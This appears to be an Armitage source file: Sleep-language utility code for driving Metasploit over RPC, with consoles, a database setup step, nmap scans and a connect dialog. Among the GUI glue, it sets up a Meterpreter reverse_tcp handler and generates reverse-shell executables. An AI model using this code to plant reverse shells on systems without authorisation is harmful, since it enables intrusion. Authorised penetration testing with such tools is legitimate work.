#
# Utility Functions for Armitage
#

import console.*;
import armitage.*;
import msf.*;

import javax.swing.*;
import javax.swing.event.*;

import java.awt.*;
import java.awt.event.*;

global('$MY_ADDRESS $RPC_CONSOLE');

# cmd($client, "console", "command here", &callback);
#    invokes a metasploit command... calls the specified callback with the output when the command is complete.
sub cmd {
	#warn("cmd called: " . @_);
	[new CommandClient: $1, "$3 $+ \n", "console.read", "console.write", $2, $4, 0];
}

sub cmd_all {
	local('$c');
	#warn("cmd_all called: " . @_);
	$c = cast(map({ return "$1 $+ \n"; }, $3), ^String);
	[new CommandClient: $1, $c, 0, "console.read", "console.write", $2, $4, $null, 0];
}

sub cmd_all_async {
	local('$c');
	#warn("cmd_all_async called: " . @_);
	$c = cast(map({ return "$1 $+ \n"; }, $3), ^String);
	[new CommandClient: $1, $c, 0, "console.read", "console.write", $2, $4, 1];
}

# cmd_async($client, "console", "command here", &callback);
#    invokes a metasploit command... calls the specified callback with the output when the command is complete.
#    this function expects that $client is a newly created console (one that will be destroyed on completion)
sub cmd_async {
	#warn("cmd_async called: " . @_);
	[new CommandClient: $1, "$3 $+ \n", "console.read", "console.write", $2, $4, 1];
}

sub cmd_async_display {
	#warn("cmd_async called: " . @_);
	[new CommandClient: $1, "$3 $+ \n", "console.read", "console.write", $2, $4, $5, 1];
}

sub call_async {
	fork({
		invoke(&call, $args);
	}, $args => @_);
}

# invokes an RPC call: call($console, "function", arg1, arg2, ...)
sub call {
	local('$exception');

	if ([SwingUtilities isEventDispatchThread]) {
		warn("[EDT] call: " . sublist(@_, 1));
	}

	try {
	        if (size(@_) > 2) {
        	        return convertAll([$1 execute: $2, cast(sublist(@_, 2), ^Object)]);
	        }
        	else {
                	return convertAll([$1 execute: $2]);
	        }
	}
	catch $exception {
		showError("Something went wrong:\nTried:  ". @_ . "\n\nError:\n $+ $exception");
	}
}

# recurses through Java/Sleep data structures and makes sure everything is a Sleep data structure.
sub convertAll {
	if ($1 is $null) {
		return $1;
	}
	else if ($1 isa ^Map) {
		return convertAll(copy([SleepUtils getHashWrapper: $1]));
	}
	else if ($1 isa ^Collection) {
		return convertAll(copy([SleepUtils getArrayWrapper: $1]));
	}
	else if (-isarray $1 || -ishash $1) {
		local('$key $value');

		foreach $key => $value ($1) {
			$value = convertAll($value);
		}
	}

	return $1;
}

# cleans the prompt text from an MSF RPC call
sub cleanText {
        return tr($1, "\x01\x02", "");
}

sub createDisplayTab {
	local('$console');
	$console = [new Console: $preferences];
	logCheck($console, "all", strrep($1, " ", "_"));
	[$frame addTab: $1, $console, $null];
	return $console;
}

# creates a new metasploit console (with all the trimmings)
sub createConsolePanel {
	local('$console $result $thread $1');
	$console = [new Console: $preferences];

	$result = call($client, "console.create");
	$thread = [new ConsoleClient: $console, $client, "console.read", "console.write", "console.destroy", $result['id'], $1];
	[$thread setMetasploitConsole];

	[$console addWordClickListener: lambda({
		local('$word');
		$word = [$1 getActionCommand];

		if ($word in @exploits || $word in @auxiliary) {
			[$thread sendString: "use $word $+ \n"];
		}
		else if ($word in @payloads) {
			[$thread sendString: "set PAYLOAD $word $+ \n"];
		}
		else if (-exists $word && !$REMOTE) {
			saveFile($word);
		}
	}, \$thread)];

	return @($result['id'], $console, $thread);
}

sub createConsoleTab {
	local('$id $console $thread $1 $2 $host $file');
	($id, $console, $thread) = createConsolePanel(
		iff([$preferences getProperty: "armitage.no_msf_banner.boolean", "false"] eq "true", 1, $2)
	);

	if ($host is $null && $file is $null) {
		logCheck($console, "all", "console");
	}
	else {
		logCheck($console, $host, $file);
	}

	[$frame addTab: iff($1 is $null, "Console", $1), $console, $thread];
	return $thread;
}

# check for a database, init if there isn't one
sub requireDatabase {
	local('$r');
	$r = call($1, "db.status");
	if ($r['driver'] eq "None" || $r['db'] is $null) {
		thread(lambda({
			yield 8192;
			local('$r');
			$r = call($client, "db.status");
			if ($r['driver'] eq "None" || $r['db'] is $null) {
				call($client, "console.destroy", $console);
				showError("Unable to connect to database.\nMake sure it's running");
				[$retry];
			}
		}, $retry => $5, \$console));

		cmd_all($client, $console, @("db_driver $2", "db_connect $3"), 
			lambda({ 
				if ($3 ne "") { 
					showError($3); 
				} 

				if ("db_connect*" iswm $1 && "*Failed to*" !iswm $3) { 
					[$continue]; 
				} 
			}, $continue => $4)
		);
	}
	else {
		[$4];
	}
}

sub setupHandlers {
	find_job("Exploit: multi/handler", {
		if ($1 == -1) {
			# setup a handler for meterpreter
			cmd_safe("setg LPORT " . randomPort(), {
				call($client, "module.execute", "exploit", "multi/handler", %(
					PAYLOAD => "windows/meterpreter/reverse_tcp",
					LHOST => "0.0.0.0",
					ExitOnSession => "false"
				));
			});
		}
	});
}

# creates the metasploit console.
sub createConsole {
	local('$r');
	$r = call($1, "console.create");
	if ($r['id'] !is $null) {
		call($1, "console.read", $r['id'] . "");
		return $r['id'] . "";
	}
}

sub getWorkspaces 
{
	return sorta(filter({ return $1["name"]; }, call($client, "db.workspaces")["workspaces"]));
}

# creates a new console and execs a cmd in it.
# cmd_safe("command to execute");
sub cmd_safe {
	local('$a $b');
	($a, $b) = @_;

	if ([SwingUtilities isEventDispatchThread]) {
		thread(lambda({
			_cmd_safe($a, $b);
		}, \$a, \$b));
	}
	else {
		_cmd_safe($a, $b);
	}
}

sub _cmd_safe {
	local('$tmp_console $2');

	$tmp_console = createConsole($client);
	cmd($client, $tmp_console, $1, lambda({
		call($client, "console.destroy", $tmp_console);
		if ($f) {
			invoke($f, @_);
		}
	}, \$tmp_console, $f => $2));
}

sub createNmapFunction {
	return lambda({
		local('$address');
		$address = ask("Enter scan range (e.g., 192.168.1.0/24):");
		if ($address eq "") { return; }

		thread(lambda({
			local('$tmp_console $display');
			$tmp_console = createConsole($client);
			$display = createDisplayTab("nmap");
		
			elog("started a scan: nmap $args $address");

			[$display append: "msf > db_nmap $args $address\n\n"];

			cmd_async_display($client, $tmp_console, "db_nmap $args $address", 
				lambda({ 
					call($client, "console.destroy", $tmp_console);
					$FIXONCE = $null;
					refreshTargets();
					fork({ showError("Scan Complete!\n\nUse Attacks->Find Attacks to suggest\napplicable exploits for your targets."); }, \$frame);
				}, \$tmp_console),
				$display
			);
		}, \$address, \$args));
	}, $args => $1);
}

sub getBindAddress {
	cmd($client, $console, "use windows/meterpreter/reverse_tcp", {
		local('$address');
		$address = call($client, "console.tabs", $console, "setg LHOST ")["tabs"];
		#warn("Options are: $address");

		$address = split('\\s+', $address[0])[2];
		
		if ($address eq "127.0.0.1") {
			[SwingUtilities invokeLater: {
				local('$address');
				$address = ask("Could not determine attack computer IP\nWhat is it?");
				if ($address ne "") {
					cmd_all($client, $console, @("back", "setg LHOST $address"), { if ($3 ne "") { setupHandlers(); } });
					$MY_ADDRESS = $address;
				}
			}];
		}
		else {
			cmd_all($client, $console, @("back", "setg LHOST $address"), { if ($3 ne "") { setupHandlers(); } });
		}

		$MY_ADDRESS = $address;
	});
}

sub randomPort {
	return int( 1024 + (rand() * 1024 * 30) );
}

sub meterpreterPayload {
	local('$port $tmp_console');
	$port = randomPort();

	$tmp_console = createConsole($client);
	cmd_all_async($client, $tmp_console, @(
		"use windows/meterpreter/reverse_tcp",
		"set LHOST $MY_ADDRESS",
		"generate -t exe -f $1",
		"back"), lambda({ 
			if ($1 eq "back\n") {
				call($client, "console.destroy", $tmp_console); 
			}
			invoke($f, @_); 
		}, $f => $2, \$tmp_console));
}

sub scanner {
	return lambda({
		launch_dialog("Scan ( $+ $type $+ )", "auxiliary", "scanner/ $+ $type", $host);
	}, $sid => $2, $host => $3, $type => $1);
}

sub connectDialog {

	# in case we ended up back here... let's kill this handle
	if ($msfrpc_handle) {
		closef($msfrpc_handle);
		$msfrpc_handle = $null;
	}

	local('$dialog $host $port $ssl $user $pass $driver $connect $button $cancel $start $center $help $helper');
	$dialog = window("Connect...", 0, 0);
	
	# setup our nifty form fields..

	$host = [new JTextField: [$preferences getProperty: "connect.host.string", "127.0.0.1"], 20];
	$port = [new JTextField: [$preferences getProperty: "connect.port.string", "55553"], 10];
	
	$ssl = [new JCheckBox: "Use SSL"];
	if ([$preferences getProperty: "connect.ssl.boolean", "false"] eq "true") {
		[$ssl setSelected: 1];
	}

	$user = [new JTextField: [$preferences getProperty: "connect.user.string", "msf"], 20];
	$pass = [new JTextField: [$preferences getProperty: "connect.pass.string", "test"], 20];

	$driver = select(@("postgresql", "mysql"), [$preferences getProperty: "connect.db_driver.string", "sqlite3"]);
	$connect = [new JTextField: [$preferences getProperty: "connect.db_connect.string", 'armitage.db.' . ticks()], 16];

	$helper = [new JButton: "?"];
	[$helper addActionListener: lambda({
		local('$dialog $user $pass $host $db $action $cancel $u $p $h $d $reset');
		$dialog = dialog("DB Connect String Helper", 300, 200);
		[$dialog setLayout: [new GridLayout: 5, 1]];

		if ([$connect getText] ismatch '(.*?):"(.*?)"@(.*?)/(.*?)') {
			($u, $p, $h, $d) = matched();
		}
		else {
			($u, $p, $h, $d) = @("user", "password", "127.0.0.1", "armitagedb");
		}

		$user = [new JTextField: $u, 20];
		$pass = [new JTextField: $p, 20];
		$host = [new JTextField: $h, 20];
		$db   = [new JTextField: $d, 20];

		$action = [new JButton: "Set"];
		$reset = [new JButton: "Default"];
		$cancel = [new JButton: "Cancel"];

		[$reset addActionListener: lambda({ 
			loadDatabasePreferences($preferences);
			[$driver setSelectedItem: [$preferences getProperty: "connect.db_driver.string", "sqlite3"]];
			[$connect setText: [$preferences getProperty: "connect.db_connect.string", 'armitage.db.' . ticks()]];
			[$dialog setVisible: 0];
		}, \$dialog, \$connect, \$driver)];

		[$action addActionListener: lambda({
			[$connect setText: [$user getText] . ':"' . 
					[$pass getText] . '"@' . 
					[$host getText] . '/' . 
					[$db getText]
			];
			[$dialog setVisible: 0];
		}, \$user, \$pass, \$host, \$db, \$dialog, \$connect)];

		[$cancel addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];

		[$dialog add: label_for("DB User", 75, $user)];
		[$dialog add: label_for("DB Pass", 75, $pass)];
		[$dialog add: label_for("DB Host", 75, $host)];
		[$dialog add: label_for("DB Name", 75, $db)];
		[$dialog add: center($action, $reset)];
		[$dialog pack];

		[$dialog setVisible: 1];
	}, \$connect, \$driver)];

	$button = [new JButton: "Connect"];
	[$button setToolTipText: "<html>Use this button to connect to a running Metasploit<br />RPC server. Metasploit must already be running.</html>"];
	$start  = [new JButton: "Start MSF"];
	[$start setToolTipText: "<html>Use this button to start a new Metasploit instance<br />and have Armitage automatically connect to it.</html>"];
	$help   = [new JButton: "Help"];
	[$help setToolTipText: "<html>Use this button to view the Getting Started Guide on the Armitage homepage</html>"];

	$cancel = [new JButton: "Exit"];

	# lay them out

	$center = [new JPanel];
	[$center setLayout: [new GridLayout: 7, 1]];

	[$center add: label_for("Host", 130, $host)];
	[$center add: label_for("Port", 130, $port)];
	[$center add: $ssl];
	[$center add: label_for("User", 130, $user)];
	[$center add: label_for("Pass", 130, $pass)];
	[$center add: label_for("DB Driver", 130, $driver)];
	[$center add: label_for("DB Connect String", 130, $connect, $helper)];

	[$dialog add: $center, [BorderLayout CENTER]];
	[$dialog add: center($button, $start, $help), [BorderLayout SOUTH]];

	[$button addActionListener: lambda({
		[$dialog setVisible: 0];
		connectToMetasploit([$host getText], [$port getText], [$ssl isSelected], [$user getText], [$pass getText], [$driver getSelectedItem], [$connect getText], 1);
	}, \$dialog, \$host, \$port, \$ssl, \$user, \$pass, \$driver, \$connect)];

	[$help addActionListener: gotoURL("http://www.fastandeasyhacking.com/start")];

	[$start addActionListener: lambda({
		local('$pass $exception');
		$pass = unpack("H*", digest(ticks() . rand(), "MD5"))[0];
		try {
			# check for MSF on Windows
			if (isWindows()) {
				$msfrpc_handle = exec("ruby msfrpcd -f -U msf -P $pass -t Basic -S", convertAll([System getenv]));
			}
			else {
				$msfrpc_handle = exec("msfrpcd -f -U msf -P $pass -t Basic -S", convertAll([System getenv]));
			}

			$RPC_CONSOLE = [new Console: $preferences];
			[$RPC_CONSOLE noInput];

			# consume bytes so msfrpcd doesn't block when the output buffer is filled
			fork({
				[$RPC_CONSOLE append: "$ msfrpcd -f -U msf -P ... -t Basic -S\n"];
				[[Thread currentThread] setPriority: [Thread MIN_PRIORITY]];

				while (1) {
					if (available($msfrpc_handle) > 0) {
						[$RPC_CONSOLE append: readb($msfrpc_handle, available($msfrpc_handle))];
					}

					if (available($msfrpc_error) > 0) {
						[$RPC_CONSOLE append: readb($msfrpc_error, available($msfrpc_error))];
					}
					sleep(1024);
				}
			}, \$msfrpc_handle, $msfrpc_error => [SleepUtils getIOHandle: [[$msfrpc_handle getSource] getErrorStream], $null], \$RPC_CONSOLE);

			[$dialog setVisible: 0];

			connectToMetasploit('127.0.0.1', "55553", 0, "msf", $pass, [$driver getSelectedItem], [$connect getText], 1);
		}
		catch $exception {
			showError("Couldn't launch MSF\n" . [$exception getMessage]);
		}
	}, \$connect, \$driver, \$dialog)];

	[$cancel addActionListener: {
		[System exit: 0];
	}];

	[$dialog pack];
	[$dialog setLocationRelativeTo: $null];
	[$dialog setVisible: 1];
}

sub elog {
	if ($client !is $mclient) {
		call($mclient, "armitage.log", $1);
	}
}
